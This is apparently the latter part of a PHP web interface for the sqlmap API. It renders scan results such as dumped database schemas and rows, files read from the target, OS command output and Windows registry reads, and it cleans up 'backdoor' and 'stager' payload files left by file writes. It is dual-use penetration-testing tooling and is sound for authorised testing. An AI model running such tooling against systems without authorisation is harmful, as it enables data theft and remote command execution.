                              echo "   [*] DB: " . htmlentities($dbName, ENT_QUOTES, 'UTF-8') . " \n";
                              echo "      [*] Tables: \n";
                              $scanResultsStrCopy .= "   [*] DB: " . $dbName . " \n";
                              $scanResultsStrCopy .= "      [*] Tables: \n";
                              foreach($tbls as $tbl) {
                                echo "         [+] " . htmlentities($tbl, ENT_QUOTES, 'UTF-8') . "\n";
                                $scanResultsStrCopy .= "         [+] " . $tbl . "\n";
                              }
                            }
                          }
                        }
                        break;

                      case "13":
                        // Columns, by Table, by Database
                        if((isset($options_to_enable['search'])) && (isset($options_to_enable['col']))) {
                          echo "[*] Column Search Term: " . htmlentities($options_to_enable['col'], ENT_QUOTES, 'UTF-8') . " \n";
                          $scanResultsStrCopy .= "   [*] Column Search Term: " . $options_to_enable['col'] . " \n";
                        } else {
                          echo "\n[*] Column Dump: \n";
                          $scanResultsStrCopy .= "\n[*] Column Dump: \n";
                        }
                        foreach($dataEntry['value'] as $dbName => $tbls) {
                          foreach($tbls as $tbl => $cols) {
                            if(is_assoc($cols)) {  // Normal Column Data Dump
                              echo "   [*] DB: " . htmlentities($dbName, ENT_QUOTES, 'UTF-8') . " \n";
                              $scanResultsStrCopy .= "   [*] DB: " . $dbName . " \n";
                              echo "   [*] Table: " . htmlentities($tbl, ENT_QUOTES, 'UTF-8') . " \n";
                              $scanResultsStrCopy .= "   [*] Table: " . $tbl . " \n";
                              echo "      [*] Columns: \n";
                              $scanResultsStrCopy .= "      [*] Columns: \n";
                              foreach($cols as $col => $col_type) {
                                echo "         [+] " . htmlentities($col, ENT_QUOTES, 'UTF-8') . ", " . htmlentities($col_type, ENT_QUOTES, 'UTF-8') . "\n";
                                $scanResultsStrCopy .= "         [+] " . $col . ", " . $col_type . "\n";
                              }
                            } else {               // Column Search, NOT a Column Data Dump Request
                              echo "   [*] DB Found In: " . htmlentities($tbl, ENT_QUOTES, 'UTF-8') . " \n";
                              $scanResultsStrCopy .= "   [*] DB Found In: " . $tbl . " \n";
                              echo "      [*] Table(s): \n";
                              $scanResultsStrCopy .= "      [*] Table(s): \n";
                              foreach($cols as $col) {
                                echo "         [+] " . htmlentities($col, ENT_QUOTES, 'UTF-8') . "\n";
                                $scanResultsStrCopy .= "         [+] " . $col . "\n";
                              }
                            }
                          }
                        }
                        break;

                      case "14":
                        // Full Schema (All Databases) & Associated Table & Column Mappings
                        if(sizeof($dataEntry['value']) > 0) {
                          echo "\n[*] Available Schema & Table Mappings: \n";
                          $scanResultsStrCopy .= "\n[*] Available Schema & Table Mappings: \n";
                          foreach($dataEntry['value'] as $dbName => $dbInfo) {
                            echo "   [*] DB: " . htmlentities($dbName, ENT_QUOTES, 'UTF-8') . " \n";
                            $scanResultsStrCopy .= "   [*] DB: " . $dbName . " \n";
                            foreach($dbInfo as $tbl => $tblInfo) {
                              echo "      [*] Table: " . htmlentities($tbl, ENT_QUOTES, 'UTF-8') . " \n";
                              $scanResultsStrCopy .= "      [*] Table: " . $tbl . " \n";
                              echo "         [*] Columns: \n";
                              $scanResultsStrCopy .= "         [*] Columns: \n";
                              foreach($tblInfo as $col => $col_type) {
                                echo "            [+] " . htmlentities($col, ENT_QUOTES, 'UTF-8') . ", " . htmlentities($col_type, ENT_QUOTES, 'UTF-8') . "\n";
                                $scanResultsStrCopy .= "            [+] " . $col . ", " . $col_type . "\n";
                              }
                            }
                          }
                        }
                        break;

                      case "15":
                        // TBD
                        $scanResultsStrCopy .= "";
                        break;

                      case "16":
                        // DB Data Dump Results
                        if((sizeof($dataEntry['value']) > 0) && (sizeof($dataEntry['value']['__infos__']) > 0)) {
                          if(!$displayed) { echo "\n"; }
                          echo "[*] DB Data Dump: \n";
                          $scanResultsStrCopy .= "[*] DB Data Dump: \n";
                          echo "   [*] DB: " . htmlentities($dataEntry['value']['__infos__']['db'], ENT_QUOTES, 'UTF-8') . " \n";
                          $scanResultsStrCopy .= "   [*] DB: " . $dataEntry['value']['__infos__']['db'] . " \n";
                          echo "   [*] Table: " . htmlentities($dataEntry['value']['__infos__']['table'], ENT_QUOTES, 'UTF-8') . " \n";
                          $scanResultsStrCopy .= "   [*] Table: " . $dataEntry['value']['__infos__']['table'] . " \n";
                          echo "   [*] Row Count: " . $dataEntry['value']['__infos__']['count'] . " \n";
                          $scanResultsStrCopy .= "   [*] Row Count: " . $dataEntry['value']['__infos__']['count'] . " \n";
                          $colFormat = "";
                          foreach($dataEntry['value'] as $colName => $colInfo) {
                            if($colName == "__infos__") { continue; }
                            $colFormat .= $colName . ", ";
                          }
                          echo "      [*] Column Data: " . htmlentities(preg_replace("#, $#", "", $colFormat), ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "      [*] Column Data: " . preg_replace("#, $#", "", $colFormat) . "\n";
                          for($i=0; $i < $dataEntry['value']['__infos__']['count']; $i++) {
                            $lineDump = "";
                            foreach($dataEntry['value'] as $colName => $colInfo) {
                              $lineDump .= $colInfo['values'][$i] . ", ";
                            }
                            echo "         [+] " . htmlentities(preg_replace("#, $#", "", $lineDump), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "         [+] " . preg_replace("#, $#", "", $lineDump) . "\n";
                          }
                        }
                        break;

                      case "17":
                        // TBD
                        $scanResultsStrCopy .= "";
                        break;

                      case "18":
                        // TBD
                        $scanResultsStrCopy .= "";
                        break;

                      case "19":
                        // TBD
                        $scanResultsStrCopy .= "";
                        break;

                      case "20":
                        // TBD
                        $scanResultsStrCopy .= "";
                        break;

                      case "21":
                        // File Read Results
                        if(($dataEntry['status'] == 1) && (sizeof($dataEntry['value']) > 0)) {
                          foreach($dataEntry['value'] as $localFilePath) {
                            if(preg_match("#\(same file\)#", $localFilePath)) {
                              $localFile = explode(" ", $localFilePath)[0];
                              if((file_exists($localFile)) && (is_readable($localFile))) {
                                if(is_ascii($localFile)) {
                                  echo "\n[*] File Content for: " . htmlentities($options_to_enable['rFile'], ENT_QUOTES, 'UTF-8') . " \n";
                                  $scanResultsStrCopy .= "\n[*] File Content for: " . $options_to_enable['rFile'] . " \n";
                                  $fh = fopen($localFile, "rb");
                                  while(!feof($fh)) {
                                    $line = fgets($fh);
                                    echo htmlentities($line, ENT_QUOTES, 'UTF-8');
                                    $scanResultsStrCopy .= $line;
                                  }
                                  fclose($fh);
                                  echo "\n";
                                  $scanResultsStrCopy .= "\n";
                                } else {
                                  echo "\n[*] Non-ASCII File Content for: " . htmlentities($options_to_enable['rFile'], ENT_QUOTES, 'UTF-8') . " \n";
                                  $scanResultsStrCopy .= "\n[*] Non-ASCII File Content for: " . $options_to_enable['rFile'] . " \n";
                                  echo "\n   [*] Unable to display as a result...\n";
                                  $scanResultsStrCopy .= "\n   [*] Unable to display as a result...\n";
                                }
                              }
                            } else {
                              $localFile = explode(" ", $localFilePath)[0];
                              echo "\n[x] Problem Reading File Content for: " . htmlentities($options_to_enable['rFile'], ENT_QUOTES, 'UTF-8') . " \n";
                              $scanResultsStrCopy .= "\n[x] Problem Reading File Content for: " . $options_to_enable['rFile'] . " \n";
                            }
                          }
                        }
                        break;

                      case "22":
                        // TBD
                        $scanResultsStrCopy .= "";
                        break;

                      case "23":
                        // osCmd Results
                        if($dataEntry['status'] == 1) {
                          echo "[*] OS Command: " . htmlentities($options_to_enable['osCmd'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "[*] OS Command: " . $options_to_enable['osCmd'] . "\n";
                          if(is_array($dataEntry['value'])) {
                            echo htmlentities($dataEntry['value'][0], ENT_QUOTES, 'UTF-8') . "\n\n";
                            $scanResultsStrCopy .= $dataEntry['value'][0] . "\n\n";
                          } else {
                            echo htmlentities($dataEntry['value'], ENT_QUOTES, 'UTF-8') . "\n\n";
                            $scanResultsStrCopy .= $dataEntry['value'] . "\n\n";
                          }
                        }
                        break;

                      case "24":
                        // Windows Registry Read
                        if($dataEntry['status'] == 1) {
                          echo "\n[*] Result from Reading Windows Registry: \n";
                          $scanResultsStrCopy .= "\n[*] Result from Reading Windows Registry: \n";
                          echo "   [*] Registry Key: " . htmlentities($options_to_enable['regKey'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "   [*] Registry Key: " . $options_to_enable['regKey'] . "\n";
                          echo "      [*] Key Value: " . htmlentities($options_to_enable['regVal'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "      [*] Key Value: " . $options_to_enable['regVal'] . "\n";
                          echo "      [*] Key Type: " . htmlentities($options_to_enable['regType'], ENT_QUOTES, 'UTF-8') . "\n";
                          $scanResultsStrCopy .= "      [*] Key Type: " . $options_to_enable['regType'] . "\n";
                          if(is_array($dataEntry['value'])) {
                            echo "      [*] Key Data Returned: " . htmlentities(str_replace($options_to_enable['regVal'] . "    " . $options_to_enable['regType'] . "    ", "", $dataEntry['value'][0]), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "      [*] Key Data Returned: " . str_replace($options_to_enable['regVal'] . "    " . $options_to_enable['regType'] . "    ", "", $dataEntry['value'][0]) . "\n";
                          } else {
                            echo "      [*] Key Data Returned: " . htmlentities(str_replace($options_to_enable['regVal'] . "    " . $options_to_enable['regType'] . "    ", "", $dataEntry['value']), ENT_QUOTES, 'UTF-8') . "\n";
                            $scanResultsStrCopy .= "      [*] Key Data Returned: " . str_replace($options_to_enable['regVal'] . "    " . $options_to_enable['regType'] . "    ", "", $dataEntry['value']) . "\n";
                          }
                        }
                        break;

                      default:
                        // Unknown Result Option...
                        $scanResultsStrCopy .= "";
                        break;
                    }
                  }
                }
                if((isset($_POST['file_privs'])) && (trim($_POST['file_privs']) == "w") && (trim($_POST['dFile']) != "")) {
                  echo "\n[*] Manual verification required for file write:\n   [*] Payload: " . htmlentities($options_to_enable['wFile'], ENT_QUOTES, 'UTF-8') . "\n   [*] File Destination: " . htmlentities($options_to_enable['dFile'], ENT_QUOTES, 'UTF-8') . "\n";
                  $scanResultsStrCopy .= "\n[*] Manual verification required for file write:\n   [*] Payload: " . $options_to_enable['wFile'] . "\n   [*] File Destination: " . $options_to_enable['dFile'] . "\n";
                }
                if((isset($options_to_enable['regAdd'])) && ($options_to_enable['regAdd'] == 'true')) {
                  echo "\n[Warning] Registry Add Option has NO Verification Step\n";
                  echo "   [*] Re-Scan with Registry Read Options Set to Validate Registry Change\n";
                  $scanResultsStrCopy .= "\n[Warning] Registry Add Option has NO Verification Step\n   [*] Re-Scan with Registry Read Options Set to Validate Registry Change\n";
                }
                // Save our results info to our own logfile, since API seems to detach log somehow....
                @mkdir(TMP_PATH);
                @mkdir(TMP_PATH .  $host_str);
                $log = TMP_PATH .  $host_str . "/api_scan.log";
                $fh = fopen($log, "a+");
                fwrite($fh, $scanResultsStrCopy);
                fclose($fh);
                chmod($log, 0644);

                echo '</textarea><br />';
                echo '<div class="col-md-4">';
                echo '<input type="submit" class="btn" name="submit" onClick="divHideAndSeek(\'display_scan_info_textarea\', 0);" value="View Scan Log"/>';
                echo '</div>';
                echo '<div class="col-md-4">';
                echo '<input type="submit" class="btn" name="submit" onClick="downloadScanResults(\'' . htmlentities($host_str, ENT_QUOTES, 'UTF-8') . '\');" value="Download Scan Results"/>';
                echo '</div>';
                echo '<div class="col-md-4">';
                echo '<input type="submit" class="btn" name="submit" onClick="divHideAndSeek(\'display_scan_data_textarea\', 0);" value="View Scan Data"/>';
                echo '</div>';
                echo "<br /><br />";
              }
              /* ? REMOVE THIS SCAN ERROR DATA WHEN FINISHED ? */
              if(sizeof($scanData['error']) > 0) {                      // Scan Error Messages - Can we parse this to create warning or error messages? Suggestions to tailor form?
                echo "<br /><br />";
                echo '<label for="results_errors_textarea">Error Messages Encountered</label>';
                echo '<textarea class="form-control" id="results_errors_textarea" rows="20">';
                print_r($scanData['error']);
                echo '</textarea>';
              }
            ?>

            <div id="display_scan_info_textarea" align="central" style="display: none">
              <br /><br />
              <label for="scan_info_textarea">Scan Log</label>
              <textarea class="form-control" id="scan_info_textarea" rows="20">
              <?php
                echo "\n";
                foreach($logData as $logEntry) {
                  if( (preg_match("#fetched random HTTP User-Agent header from file|the local file#", $logEntry['message']))
                  || (trim($logEntry['message']) == "")) {
                    continue;  // A few Full Path Disclosures we dont need to show users, so we will just skip these lines....
                  }
                  // Sort log message type, color code them in the future perhaps....
                  if($logEntry['level'] == "INFO") { 
                    echo "[INFO] [" . $logEntry['time'] . "] " . htmlentities($logEntry['message'], ENT_QUOTES, 'UTF-8') . "\n";
                  } else if($logEntry['level'] == "WARNING") { 
                    echo "[WARNING] [" . $logEntry['time'] . "] " . htmlentities($logEntry['message'], ENT_QUOTES, 'UTF-8') . "\n";
                  } else { 
                    echo "[OTHER] [" . $logEntry['time'] . "] " . htmlentities($logEntry['message'], ENT_QUOTES, 'UTF-8') . "\n";
                  }
                }
                echo "\n";
              ?>
              </textarea>
              <input type="submit" class="btn" name="submit" onClick="divHideAndSeek('display_scan_info_textarea', 1);" value="Hide Scan Log"/>
            </div>

            <?php
              /* DELETE THIS LATER, ONLY FOR DEBUGGING */
              if(sizeof($scanData['data']) > 0) {
                echo '<div id="display_scan_data_textarea" align="central" style="display: none">';
                echo '  <br /><br />';
                echo '  <label for="scan_data_textarea">Scan Data</label>';
                echo '  <textarea class="form-control" id="scan_data_textarea" rows="20">';
                        print_r($scanData['data']);
                        echo "\n########################################################################\n";
                        echo "[*] API Scan Configuration Settings:\n";
                        print_r($sqlmap->listOptions($scanID));
                echo '  </textarea>';
                echo '<input type="submit" class="btn" name="submit" onClick="divHideAndSeek(\'display_scan_data_textarea\', 1);" value="Hide Scan Log"/>';
                echo '</div>';
              }
            ?>
          </div>
        </div>
        <div class="col-md-2"></div>
      </div>

    <?php  } else { // No API, Can't Do Anything.... ?>
      <div class="epic_fail" align="center">
        <p style="font-size:26px">Halt - Epic Failure!</p><br />
        <p style="font-size:20px">
          Failed to Connect to SQLMAP API!<br /><br />
        </p>
        <p style="font-size:16px">
          Check to make sure the API Server is running and try again.....
          Redirecting back to form....<br />
        </p>
      </div>
      <script>setTimeout('redirectHome()', 5000);</script>
    <?php  } ?>

  <?php  } else { // Else we Reject Form Data Received! ?>

    <div class="epic_fail" align="center">
      <p style="font-size:26px">Halt - Epic Failure!</p><br />
      <p style="font-size:20px">
        Missing target URL or an invalid form token was provided!<br /><br />
      </p>
      <p style="font-size:16px">
        Redirecting back to form so you can try again....<br />
      </p>
    </div>
    <script>setTimeout('redirectHome()', 5000);</script>

  <?php  }

  include_once("footer.php");

  if((isset($scanID)) && (trim($scanID) != "")) {
    $sqlmap->deleteTaskID($scanID); // Delete Scan Task

    // Cleanup Payload Files from any File Write Activities...
    if((isset($_POST['file_privs'])) && (trim($_POST['file_privs']) == "w") && (trim($_POST['dFile']) != "")) {
      $items = glob(TMP_PATH . "backdoor.**");
      foreach($items as $item) {
        @unlink($item);
      }
      $items = glob(TMP_PATH . "stager.**");
      foreach($items as $item) {
        @unlink($item);
      }
    }
  }

?>
